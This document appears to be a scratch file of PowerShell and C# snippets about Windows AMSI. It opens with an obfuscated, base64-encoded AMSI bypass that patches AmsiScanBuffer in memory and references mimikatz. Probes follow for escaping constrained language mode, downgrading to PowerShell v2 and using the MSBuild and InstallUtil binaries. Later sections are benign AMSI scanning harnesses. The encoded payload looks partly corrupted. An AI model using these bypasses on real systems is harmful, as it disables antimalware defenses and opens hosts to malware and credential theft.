powershell -NoP -Exec Bypass -C "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFM9IlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQW1zaVV0aWxzIjskRj0iYW1zaUluaXRGYWlsZWQiOyRULT1bUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCRTKTtpZigkVCkkeyRNPVFUuR2V0RmllbGQoJEYsJydOb25QdWJsaWMsU3RhdGljJykpO2lmKCRNKXskTS5TZXRWYWx1ZSgkbnVsbCxSdHJ1ZSk7V3JpdGUtSG9zdCAi4jggUmVmbGVjdGlvbiBCeXBhc3MgKGFtc2lJbml0RmFpbGVkKSBzdWNjZWVkZWQuIjt9ZWxzZXtXcml0ZS1Ib3N0ICLi7SBSZWZsZWN0aW9uIEJ5cGFzcyBmYWlsZWQgKEZpZWxkIG5vdCBmb3VuZCkuIjt9fWVsc2V7V3JpdGUtSG9zdCAi4u0gUmVmbGVjdGlvbiBCeXBhc3MgZmFpbGVkIChUeXBlIG5vdCBmb3VuZCkuIjt9CiRDPScKW0RsbEltcG9ydChcImtlcm5lbDMyXCIpXWJvb2wgVmlydHVhbFByb3RlY3QoSW50clBsYXRmb3JtIGxwQWRkcmVzcyxVaW50UHRyIGR3U2l6ZSx1aW50IGZsTmV3UHJvdGVjdCxvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7XG5bRGxsSW1wb3J0KFwia2VybmVsMzJcIildSW50clBsYXRmb3JtIEdldFByb2NBZGRyZXNzKEludHJQbGF0Zm9ybSBoTW9kdWxlLHN0cmluZyBscFByb2NOYW1lKTtcbltEbGxJbXBvcnQoXCJrZXJuZWwzMlwiKV1JbnRyUGxhdGZvcm0gR2V0TW9kdWxlSGFuZGxlKHN0cmluZyBscE1vZHVsZU5hbWUpOyc7JE49J0Ftc2lCeXBhc3MnO0FkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAiVXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOyRDIiAtTmFtZSAkTiAtTmFtZXNwYWNlICJXIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsKaWYoW1cuQW1zaUJ5cGFzcyldKXsKICAgIHRyeXsKICAgICAgICAkZD0iYW0iKyJzaS5kIisibGwiOyRmPSJBYSIrInNpU2NhbiIrIkJ1ZmZlciI7CiAgICAgICAgJGE9W1cuQW1zaUJ5cGFzcyk6OkdldFByb2NBZGRyZXNzKFtXAEFtc2lCeXBhc3NdOjpHZXRNb2R1bGVIYW5kbGUoJGQpLCAkZik7CiAgICAgICAgJHA9W2J5dGVbXV0oMHg3MiwweDNBLDB4MUMsMHgzNSwweDAyLDB4MzgsMHgwMCwweDcyLDB4MDApOyMgQ29tcGxleCBwYXRjaCBmb3IgbW9kZXJuIERlZmVuZGVyCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkcCwwLCRhLCRwLkxvbmdMZW5ndGgpOwogICAgICAgIFtXAEFtc2lCeXBhc3NdOjpWaXJ0dWFsUHJvdGVjdCgkYSwweDc1LDB4NDAsW3JlZl0kbzkgIHwgb3V0LW51bGw7CiAgICAgICAgV3JpdGUtSG9zdCAi4jggTWVtb3J5IFBhdGNoIEJ5cGFzcyAoQW1zaVNjYW5CdWZmZXIpIHN1Y2NlZWRlZC4iO30KICAgIGNhdGNoewogICAgICAgIFdyaXRlLUhvc3QgIuLuIFBhdGNoIEJ5cGFzcyBmYWlsZWQ6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIjsKICAgIH0KfWVsc2V7V3JpdGUtSG9zdCAi4u0gTWVtb3J5IFBhdGNoIEJ5cGFzcyBmYWlsZWQgKEFkZC1UeXBlIGZhaWxlZCkuIjt9CgpHcm91cC1PYmplY3QgLSByYW5kb21BcnJheSwgbWltaWthdHogLSBlcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgb3V0LW51bGw7CldyaXRlLUhvc3QgIi0tLVRlc3QgQ29tcGxldGVSZXBvcnQgLS0tIiB8IEZsdXNoLW91dHB1dA=='))) | Out-String | Select-String -NotMatch 'Out-Null|SilentlyContinue|ErrorAction' -Exclude $null"




cmd /c echo "$ExecutionContext.SessionState.LanguageMode" > system32test.ps1

powershell -NoP -Exec Bypass -C "$P=$pwd.path; md C:\Windows\Temp\System32Test | Out-Null; cp system32test.ps1 C:\Windows\Temp\System32Test\test.ps1; cd C:\Windows\Temp\System32Test; .\test.ps1; cd $P; rm C:\Windows\Temp\System32Test -Recurse -Force | Out-Null"



powershell -NoP -Exec Bypass -C "$P=$pwd.path; $TEST_DIR='C:\Windows\Temp\WindowsPowerShell\v1.0\Modules'; md $TEST_DIR | Out-Null; cp system32test.ps1 $TEST_DIR\test.ps1; cd $TEST_DIR; .\test.ps1; cd $P; rm C:\Windows\Temp\WindowsPowerShell -Recurse -Force | Out-Null"


powershell -version 2 -NoP -Exec Bypass -C "$ExecutionContext.SessionState.LanguageMode"


# 1. Test MSBuild.exe
& 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe' /?

# 2. Test InstallUtil.exe
& 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe' /?


cmd /c wscript.exe C:\Windows\System32\cmd.exe /c "echo SUCCESS: Non-PowerShell Command Execution is working"




Add-Type -AssemblyName System.Runtime.InteropServices

$amsiCode = @"
using System;
using System.Runtime.InteropServices;

public static class AmsiHarness
{
    [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
    public static extern int AmsiInitialize(string appName, out IntPtr amsiContext);

    [DllImport("amsi.dll")]
    public static extern void AmsiUninitialize(IntPtr amsiContext);

    [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
    public static extern int AmsiOpenSession(IntPtr amsiContext, out IntPtr session);

    [DllImport("amsi.dll")]
    public static extern void AmsiCloseSession(IntPtr amsiContext, IntPtr session);

    [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
    public static extern int AmsiScanBuffer(
        IntPtr amsiContext,
        byte[] buffer,
        uint length,
        string contentName,
        IntPtr session,
        out uint result);
}
"@

Add-Type -TypeDefinition $amsiCode

function Invoke-AmsiScanString {
    param(
        [Parameter(Mandatory)]
        [string]$InputString
    )

    $ctx = [IntPtr]::Zero
    $session = [IntPtr]::Zero
    $res = 0

    $hr = [AmsiHarness]::AmsiInitialize("ResearchHarness", [ref]$ctx)
    if ($hr -ne 0) {
        Write-Host "AmsiInitialize failed: $hr"
        return
    }

    try {
        $hr = [AmsiHarness]::AmsiOpenSession($ctx, [ref]$session)
        if ($hr -ne 0) {
            Write-Host "AmsiOpenSession failed: $hr"
            return
        }

        $bytes = [System.Text.Encoding]::Unicode.GetBytes($InputString)
        $scanResult = 0u

        $hr = [AmsiHarness]::AmsiScanBuffer(
            $ctx,
            $bytes,
            [uint32]$bytes.Length,
            "TestContent",
            $session,
            [ref]$scanResult
        )

        Write-Host "Scan HRESULT: $hr, AMSI_RESULT: $scanResult"
    }
    finally {
        if ($session -ne [IntPtr]::Zero) {
            [AmsiHarness]::AmsiCloseSession($ctx, $session)
        }
        if ($ctx -ne [IntPtr]::Zero) {
            [AmsiHarness]::AmsiUninitialize($ctx)
        }
    }
}





using System;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    private static class AmsiHarness
    {
        [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
        public static extern int AmsiInitialize(string appName, out IntPtr amsiContext);

        [DllImport("amsi.dll")]
        public static extern void AmsiUninitialize(IntPtr amsiContext);

        [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
        public static extern int AmsiOpenSession(IntPtr amsiContext, out IntPtr session);

        [DllImport("amsi.dll")]
        public static extern void AmsiCloseSession(IntPtr amsiContext, IntPtr session);

        [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
        public static extern int AmsiScanBuffer(
            IntPtr amsiContext,
            byte[] buffer,
            uint length,
            string contentName,
            IntPtr session,
            out uint result);
    }

    static void Main(string[] args)
    {
        Console.Write("Enter string to scan: ");
        string input = Console.ReadLine() ?? string.Empty;

        IntPtr ctx = IntPtr.Zero;
        IntPtr session = IntPtr.Zero;
        uint result;

        int hr = AmsiHarness.AmsiInitialize("ResearchHarness", out ctx);
        if (hr != 0)
        {
            Console.WriteLine($"AmsiInitialize failed: 0x{hr:X8}");
            return;
        }

        try
        {
            hr = AmsiHarness.AmsiOpenSession(ctx, out session);
            if (hr != 0)
            {
                Console.WriteLine($"AmsiOpenSession failed: 0x{hr:X8}");
                return;
            }

            byte[] bytes = Encoding.Unicode.GetBytes(input);
            hr = AmsiHarness.AmsiScanBuffer(
                ctx,
                bytes,
                (uint)bytes.Length,
                "TestContent",
                session,
                out result
            );

            Console.WriteLine($"Scan HRESULT: 0x{hr:X8}, AMSI_RESULT: 0x{result:X8}");
        }
        finally
        {
            if (session != IntPtr.Zero)
                AmsiHarness.AmsiCloseSession(ctx, session);
            if (ctx != IntPtr.Zero)
                AmsiHarness.AmsiUninitialize(ctx);
        }
    }
}




==============





# AmsiHarness.ps1

if ($ExecutionContext.SessionState.LanguageMode -ne 'FullLanguage') {
    Write-Warning "This harness requires FullLanguage mode. Current mode: $($ExecutionContext.SessionState.LanguageMode)"
    return
}

$amsiCode = @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class AmsiHarness
{
    [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
    public static extern int AmsiInitialize(string appName, out IntPtr amsiContext);

    [DllImport("amsi.dll")]
    public static extern void AmsiUninitialize(IntPtr amsiContext);

    [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
    public static extern int AmsiOpenSession(IntPtr amsiContext, out IntPtr session);

    [DllImport("amsi.dll")]
    public static extern void AmsiCloseSession(IntPtr amsiContext, IntPtr session);

    [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
    public static extern int AmsiScanBuffer(
        IntPtr amsiContext,
        byte[] buffer,
        uint length,
        string contentName,
        IntPtr session,
        out uint result);
}
"@

Add-Type -TypeDefinition $amsiCode

function Invoke-AmsiScanString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [string]$InputString,

        [string]$Name = "StringContent"
    )

    begin {
        $script:ctx = [IntPtr]::Zero
        $script:session = [IntPtr]::Zero

        $hr = [AmsiHarness]::AmsiInitialize("PS-AmsiHarness", [ref]$script:ctx)
        if ($hr -ne 0) { throw "AmsiInitialize failed: 0x{0:X8}" -f $hr }

        $hr = [AmsiHarness]::AmsiOpenSession($script:ctx, [ref]$script:session)
        if ($hr -ne 0) { throw "AmsiOpenSession failed: 0x{0:X8}" -f $hr }
    }

    process {
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($InputString)
        $scanResult = 0u

        $hr = [AmsiHarness]::AmsiScanBuffer(
            $script:ctx,
            $bytes,
            [uint32]$bytes.Length,
            $Name,
            $script:session,
            [ref]$scanResult
        )

        [pscustomobject]@{
            Type        = 'String'
            Name        = $Name
            HResultHex  = ('0x{0:X8}' -f $hr)
            AmsiResult  = ('0x{0:X8}' -f $scanResult)
        }
    }

    end {
        if ($script:session -ne [IntPtr]::Zero) {
            [AmsiHarness]::AmsiCloseSession($script:ctx, $script:session)
        }
        if ($script:ctx -ne [IntPtr]::Zero) {
            [AmsiHarness]::AmsiUninitialize($script:ctx)
        }
    }
}

function Invoke-AmsiScanFile {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [Alias('FullName')]
        [string]$Path
    )

    process {
        if (-not (Test-Path -LiteralPath $Path)) {
            Write-Warning "File not found: $Path"
            return
        }

        $content = Get-Content -LiteralPath $Path -Raw -ErrorAction Stop
        Invoke-AmsiScanString -InputString $content -Name $Path
    }
}



================


function Invoke-AmsiFolderScan {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Path,

        [string[]]$Include = @('*.ps1','*.psm1','*.psd1','*.vbs','*.js','*.wsf'),

        [switch]$Recurse,

        [string]$OutCsv
    )

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Folder not found: $Path"
    }

    $files = foreach ($pattern in $Include) {
        Get-ChildItem -LiteralPath $Path -Filter $pattern -File -ErrorAction SilentlyContinue -Recurse:$Recurse
    } | Sort-Object -Property FullName -Unique

    if (-not $files) {
        Write-Host "No matching files found." -ForegroundColor Yellow
        return
    }

    $results = $files | Invoke-AmsiScanFile

    if ($OutCsv) {
        $results | Export-Csv -NoTypeInformation -Path $OutCsv -Encoding UTF8
        Write-Host "Results written to $OutCsv"
    } else {
        $results
    }
}


==============

function Test-AmsiIntegration {
    [CmdletBinding()]
    param(
        [string]$TestString = 'Write-Host "TestStringFromAmsiHealthCheck"'
    )

    Write-Host "[*] Running AMSI health check..." -ForegroundColor Cyan
    $mode = $ExecutionContext.SessionState.LanguageMode
    Write-Host "    LanguageMode: $mode"

    try {
        $ps = [System.Management.Automation.PowerShell]::Create()
        $null = $ps.AddScript($TestString)
        $output = $ps.Invoke()

        if ($ps.Streams.Error.Count -gt 0) {
            Write-Warning "Errors during execution (these may or may not be AMSI related):"
            $ps.Streams.Error | ForEach-Object { $_.ToString() }
        } else {
            Write-Host "Script executed. AMSI did not block it (which is expected for benign content)." -ForegroundColor Green
        }

        [pscustomobject]@{
            LanguageMode = $mode
            Output       = $output | Out-String
            ErrorCount   = $ps.Streams.Error.Count
        }
    }
    finally {
        if ($ps) { $ps.Dispose() }
    }
}


==============



